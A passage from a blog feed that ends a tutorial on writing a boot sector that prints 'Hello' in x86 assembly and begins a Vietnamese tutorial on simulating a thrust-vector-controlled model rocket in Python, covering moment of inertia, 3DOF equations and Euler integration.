</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span> <span style="color:#7f848e">; l is still on al
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">o</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span></code></pre></div><p>After printing, we can just program an infinite loop like before, so the full program should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">ah</span>, <span style="color:#d19a66">0x0e</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">H</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">e</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">l</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span> <span style="color:#7f848e">; l is still on al
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">o</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">jmp</span> <span style="color:#e06c75">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">times</span> <span style="color:#d19a66">510</span>-(<span style="color:#e06c75">$-$$</span>) <span style="color:#e06c75">db</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">dw</span> <span style="color:#d19a66">0xaa55</span>
</span></span></code></pre></div><p>If we compile and emulate this program, we should get this result:</p>

    <img src="/img/os-dev/boot-sector/bootsector-print-hello.png"  alt="Boot sector print hello"  class="center"  style="padding: 10px"  />


<h2 id="wrap-up">Wrap up</h2>
<p>That was the basics of boot sector. We touched on what a boot sector is, how it works, and how to program a simple boot sector from scratch.</p>
<p>In the <a href="./os-dev-3.md">next post</a>, we&rsquo;ll develop this boot sector further and explore more boot sector concepts.</p>
]]></content>
        </item>
        
        <item>
            <title>Mô Phỏng Tên Lửa Điều Chỉnh Vectơ Đẩy trong Python</title>
            <link>https://namberino.github.io/vi/posts/2024/06/m%C3%B4-ph%E1%BB%8Fng-t%C3%AAn-l%E1%BB%ADa-%C4%91i%E1%BB%81u-ch%E1%BB%89nh-vect%C6%A1-%C4%91%E1%BA%A9y-trong-python/</link>
            <pubDate>Wed, 05 Jun 2024 20:31:39 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/06/m%C3%B4-ph%E1%BB%8Fng-t%C3%AAn-l%E1%BB%ADa-%C4%91i%E1%BB%81u-ch%E1%BB%89nh-vect%C6%A1-%C4%91%E1%BA%A9y-trong-python/</guid>
            <description>&lt;p&gt;Kĩ thuật tên lửa là 1 topic mà mình rất thích và mình cũng muốn thử build 1 tên lửa mô hình từ rất lâu rồi. Nhưng do nhiều lí do khác nhau, mình không thể build 1 cái tên lửa mô hình được. Thế nên mình sẽ đi theo hướng mô phỏng tên lửa.&lt;/p&gt;
&lt;p&gt;Mình sẽ build 1 chương trình mô phỏng cho 1 cái tên lửa điều khiển vectơ đẩy. Loại tên lửa này có thể điều chỉnh hướng phóng của động cơ để thay đổi hướng bay. Tên lưa này sẽ được cấu hình khá giống với thực thế, nó sẽ không giống với thực tế 100%, nhưng đa phần thì nó sẽ giống với thực tế. Mình đã ghi chép lại tất cả chi tiết về dự án này để bất kì ai cũng có thể đọc và học làm theo được.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Kĩ thuật tên lửa là 1 topic mà mình rất thích và mình cũng muốn thử build 1 tên lửa mô hình từ rất lâu rồi. Nhưng do nhiều lí do khác nhau, mình không thể build 1 cái tên lửa mô hình được. Thế nên mình sẽ đi theo hướng mô phỏng tên lửa.</p>
<p>Mình sẽ build 1 chương trình mô phỏng cho 1 cái tên lửa điều khiển vectơ đẩy. Loại tên lửa này có thể điều chỉnh hướng phóng của động cơ để thay đổi hướng bay. Tên lưa này sẽ được cấu hình khá giống với thực thế, nó sẽ không giống với thực tế 100%, nhưng đa phần thì nó sẽ giống với thực tế. Mình đã ghi chép lại tất cả chi tiết về dự án này để bất kì ai cũng có thể đọc và học làm theo được.</p>
<blockquote>
<p>Note: Mình sẽ không mô phỏng những yếu tố như gió hay lực cản không khí bởi vì nó hơi quá phức tạp cho cái scope của dự án này. Mình cũng sẽ không lập trình PID hay tạo hệ thống điều khiển đóng gì cả. Mình sẽ add các yếu tố và hệ thống điều khiển vào chương trình mô phỏng này trong tương lai.</p></blockquote>
<h2 id="đo-đạc-thông-số-về-tên-lửa">Đo đạc thông số về tên lửa</h2>
<p>1 chỉ số rất quan trọng mà chúng ta sẽ cần để làm mô phỏng là <em>mô men quán tính khối lượng</em>. Mô men quán tính khối lượng có thể được hiểu là độ &ldquo;kháng lại&rdquo; của tên lửa với thay đổi về mặt quán tính. Cả khối lượng riêng và sự phân bố khối lượng sẽ làm ảnh hưởng tới mô men quán tính khối lượng.</p>
<p>Mình sẽ giải thích ngắn gọn về các chỉ số đo và cách đo. Nếu như bạn muốn hiểu rõ hơn về chỉ số, cách đo và muốn nhìn minh hoa thì bạn có thể xem <a href="https://www.youtube.com/watch?v=nwgd1CV__rs">video này của BPS space</a>. Mình lấy các chỉ số từ video này luôn bởi vì mình không có cách nào để đo 1 tên lửa mô hình ngoài đời thật.</p>
<p>Để tính mô men quán tính khối lượng thì chúng ta sẽ cần khối lượng của tên lửa (<em>kg</em>). Tên lửa của mình sẽ có khối lượng là $0.543kg$.</p>
<p>Tiếp theo, chúng ta cần chỉ số COM-string, chỉ số này sẽ là $0.3m$, chúng ta cũng cần độ dài của dây treo, chỉ số này sẽ là $0.65m$.</p>
<p>Tiếp theo, chúng ta cũng sẽ cần chỉ số cánh tay đòn của tên lửa. Cánh tay đòn là khoảng cách giữa điểm gắn bộ đẩy và trọng tâm của tên lửa. Chỉ số này sẽ rất quan trọng khi chúng ta cần tính mô men xoắn. Chỉ số cánh tay đòn của mình sẽ là $0.28m$.</p>
<p>Tiếp theo thì chúng ta sẽ cần thời gian trung bình giữa mỗi giao động của tên lửa. Chỉ số thời gian này của mình sẽ là $1.603s$.</p>
<p>Mình chỉ nhắc đến các chỉ số này thôi, nếu như bạn muốn biết chi tiết hơn về các chỉ số này thì bạn có thể xem video của BPS space được nhắc đến ở trên.</p>
<p>Tóm gọn lại thì đây là tất cả các chỉ số chúng ta sẽ cần để tính mô men quán tính khối lượng:</p>
<ul>
<li>Trọng lượng của tên lửa: $m = 0.543kg$</li>
<li>Gia tốc trọng trường: $g = 9.81 m / s^2$</li>
<li>Thời gian giữa các giao động: $R_t = 1.603s$</li>
<li>Khoảng cách từ trọng tâm tới dây treo: $d = 0.3m$</li>
<li>Độ dài của dây treo: $l = 0.65m$</li>
</ul>
<p>We can then plug these values into the mass moment of inertia equation: Với những chỉ số này, mình có thể sử dụng phương trình mô men quán tính khối lượng:</p>
<p>$$
MMOI = \frac{m * g * R_t^2 * d^2}{4 \pi^2 * l}
$$</p>
<p>Mình tính ra được giá trị mô men quán tính khối lượng là $0.048kg \cdot m^2$.</p>
<h2 id="3-bậc-tự-do">3 bậc tự do</h2>
<p>1 tên lửa thường sẽ có 3 bậc tự do (<em>3DOF</em>): pitch, yaw, và roll. Bức ảnh này (từ <a href="https://en.wikipedia.org/wiki/Six_degrees_of_freedom">Wikipedia</a>) cho thấy mỗi bậc tự do là gì trong không gian 3D:</p>

    <img src="/img/tvc-modeling/3dof-visual.png"  alt="3DOF visualization"  class="center"  style="padding: 10px"  />


<p>Hàm 3 bật tự do sẽ giúp chúng ta mô phỏng động lực bay của tên lửa bằng cách tính toán sự vận động và góc độ dựa trên lực và mô men được áp đặt lên tên lửa đó. Bởi vì mình đang build chương trình mô phỏng 2D, mình chỉ cần hàm 3DOF có thể tính toán ở trục X và Z.</p>
<p>Chúng ta sẽ cần dữ liệu về lực, mô men, và trọng lượng để có thể mô phỏng động lực của nó. Đầu ra của sẽ là các thông tin đại diện cho trạng thái của tên lửa trong khi nó bay.</p>
<p>Đầu vào của hàm 3DOF:</p>
<ul>
<li>Lực tác động ở trục X và Z ($Fx$ và $Fz$)</li>
<li>Mô men pitch ($My$): Đại diện cho mô men xoắn</li>
</ul>
<p>Đầu ra của hàm 3DOF:</p>
<ul>
<li>Góc pitch ($\theta$): Góc giữa trục tên lửa với mặt phẳng tham chiếu</li>
<li>Độ thay đổi góc pitch ($q$): Độ thay đổi của góc pitch</li>
<li>Gia tốc góc pitch ($dqdt$): Độ thay đổi của độ thay đổi của góc pitch</li>
<li>Tọa độ ($(x, z)$): Tọa độ vị trí của tên lửa</li>
<li>Vận tốc ($(u, w)$): ận tốc ở trúc X và Z của tên lửa</li>
<li>Gia tốc ($(Ax, Az)$): Gia tốc của tên lửa</li>
</ul>
<p>Đây là pitch trong tên lửa:</p>

    <img src="/img/tvc-modeling/rocket-pitch.png"  alt="Rocket&#39;s pitch"  class="center"  style="padding: 10px"  />


<h2 id="lập-trình-hàm-3dof">Lập trình hàm 3DOF</h2>
<p>Chúng ta sẽ cần thư viện numpy và matplotlib để lập trình:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">numpy</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">np</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">matplotlib.pyplot</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">plt</span>
</span></span></code></pre></div><p>Hàm 3DOF sẽ cần thông số của tên lửa khi nó chưa được phóng:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#98c379">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">Đầu vào:
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- Fx: Lực ở trục X (N)
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- Fz: Lực ở trục Z (N)
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- My: Mô mem pitch, đại diện cho mô mem xoắn (Nm)
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- u0: Vận tốc bắt đầu ở trục X
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- w0: Vận tốc bắt đầu ở trục Z
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- theta0: Góc pitch bắt đầu
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- q0: Độ thay đổi bắt đầu của góc pitch
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- pos0: Điểm xuất phát [x, z]
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- mass: Trọng lượng
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- inertia: Mô men quán tính khối lượng
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- g: Gia tốc trọng trường
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- dt: Bước nhảy thời gian
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">- duration: Thời gian mô phỏng
</span></span></span><span style="display:flex;"><span><span style="color:#98c379">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">three_dof_body_axes</span>(<span style="color:#e06c75">Fx</span>, <span style="color:#e06c75">Fz</span>, <span style="color:#e06c75">My</span>, <span style="color:#e06c75">u0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">w0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">theta0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">q0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">pos0</span><span style="color:#56b6c2">=</span>[<span style="color:#d19a66">0.0</span>, <span style="color:#d19a66">0.0</span>], <span style="color:#e06c75">mass</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>, <span style="color:#e06c75">inertia</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">g</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">9.81</span>, <span style="color:#e06c75">dt</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.01</span>, <span style="color:#e06c75">duration</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">10</span>):
</span></span></code></pre></div><p>Bước nhảy thời gian ở đây là đại diện cho khoảng thời gian nhỏ mà các phương trình sẽ được thực hiện để tính toán thay đổi trong trạng thái của tên lửa.</p>
<p>Mình sẽ gán các đầu vào này vào 1 biến trong hàm để mình làm việc với các dữ liệu đó dễ hơn:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">pos</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">pos0</span>, <span style="color:#e06c75">dtype</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">float</span>) <span style="color:#7f848e"># đảm bảo pos0 là mảng float</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">u</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">u0</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">w</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">w0</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">vel</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">u</span>, <span style="color:#e06c75">w</span>]) <span style="color:#7f848e"># vận tốc</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">theta</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">theta0</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">q</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">q0</span>
</span></span></code></pre></div><p>Chúng ta sẽ cần tính gia tốc đầu bắt đầu của tên lửa ở trục X và Z. Chúng ta có thể sử dụng phương trình $F=ma$ để tính. Ở trục Z thì chúng ta cũng cần trừ gia tốc trọng trường bởi vì trọng lực. Mình sẽ truy cập giá trị lực bắt đầu của 2 trục bằng cách lấy giá trị đầu tiên của <code>Fx</code> và <code>Fz</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fx</span>[<span style="color:#d19a66">0</span>] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">az</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fz</span>[<span style="color:#d19a66">0</span>] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">g</span>
</span></span></code></pre></div><p>Mình sẽ tạo ra 1 vài mảng để giữ các dữ liệu trạng thái ở mỗi khoảng thời gian nhỏ $dt$:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">theta_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">theta</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">q_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">q</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">dqdt_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pos_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">pos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>()]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">velocity_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">vel</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>()]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">acceleration_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">ax</span>, <span style="color:#e06c75">az</span>])]
</span></span></code></pre></div><p>Bởi vì chúng ta thực chất là đang giải 1 đống phương trình vi phần thường (ODE), chúng ta có thể dùng phương pháp Euler để giải các phương trình này và cập nhật các biến trạng thái trong mảng đầu ra:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># tích phân theo thời gian bằng phương pháp Euler</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#e06c75">dt</span>, <span style="color:#e06c75">duration</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>): <span style="color:#7f848e"># bắt đầu ở dt và kết thúc ở duration</span>
</span></span></code></pre></div><p>Vòng lặp này cho phép chúng ta tính toán và dùng phương trình ở mỗi thời điểm $dt$, là khoảng $0.01s$.</p>
<p>Chúng ta cũng cần tính gia tốc tức thì ở trục X và Z tại thời điểm $dt$:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># tính gia tốc</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fx</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">az</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fz</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">g</span>
</span></span></code></pre></div><p>Chúng ta có thể tính toán gia tốc góc pitch bằng cách chia mô men xoắn với mô men quán tính khối lượng. Bạn có thể nghĩ nó như là chia mô men xoắn với độ &ldquo;kháng lại&rdquo; thay đổi với quán tính:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># tính gia tốc góc pitch</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">dqdt</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">My</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">inertia</span>
</span></span></code></pre></div><p>Chúng ta cũng cần tính vận tốc X và Z, độ thay đổi của góc pitch, vị trí và góc pitch tại thời điểm $dt$ có tính đến các trạng thái trước đó. Cách tính này sẽ cho phép chúng ta mô phỏng cách mà động lực của tên lửa sẽ thay đổi theo thời gian:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># tính vận tốc và độ thay đổi của góc pitch</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">u</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">ax</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">w</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">az</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">q</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">dqdt</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># tính vị trí</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pos</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">vel</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">vel</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">u</span>, <span style="color:#e06c75">w</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># tính góc pitch</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">theta</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">q</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span></code></pre></div><p>Sau khi tính toán thì chúng ta sẽ cần lưu lại các giá trị này vào trong mảng đầu ra:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">theta_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">theta</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">q_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">q</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">dqdt_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">dqdt</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pos_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">pos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>())
</span></span><span style="display:flex;"><span><span style="color:#e06c75">velocity_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">vel</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>())
</span></span><span style="display:flex;"><span><span style="color:#e06c75">acceleration_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">ax</span>, <span style="color:#e06c75">az</span>]))
</span></span></code></pre></div><p>Chúng ta cũng sẽ cần 1 điều khiện ngừng để tính đến trường hợp tên lửa đâm vào mặt đất. Chúng ta có thể check xem giá trị vị trí ở trục Z có nhỏ hơn hoặc bằng 0 ở thời điện hiện tại hay ko. Chúng ta cũng cần đợi khoảng 2 giây để tên lửa có thể phóng lên từ vị trí 0:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#e06c75">pos</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span> <span style="color:#56b6c2">and</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">2</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">break</span>
</span></span></code></pre></div><p>Đó là cách lập trình hàm 3DOF. Đây là code full của hàm đó:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">three_dof_body_axes</span>(<span style="color:#e06c75">Fx</span>, <span style="color:#e06c75">Fz</span>, <span style="color:#e06c75">My</span>, <span style="color:#e06c75">u0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">w0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">theta0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">q0</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">pos0</span><span style="color:#56b6c2">=</span>[<span style="color:#d19a66">0.0</span>, <span style="color:#d19a66">0.0</span>], <span style="color:#e06c75">mass</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>, <span style="color:#e06c75">inertia</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.0</span>, <span style="color:#e06c75">g</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">9.81</span>, <span style="color:#e06c75">dt</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.01</span>, <span style="color:#e06c75">duration</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">10</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pos</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">pos0</span>, <span style="color:#e06c75">dtype</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">float</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">u</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">u0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">w</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">w0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">theta</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">theta0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">q</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">q0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">vel</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">u</span>, <span style="color:#e06c75">w</span>])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fx</span>[<span style="color:#d19a66">0</span>] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">az</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fz</span>[<span style="color:#d19a66">0</span>] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">g</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">theta_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">theta</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">q_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">q</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">dqdt_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0</span>]
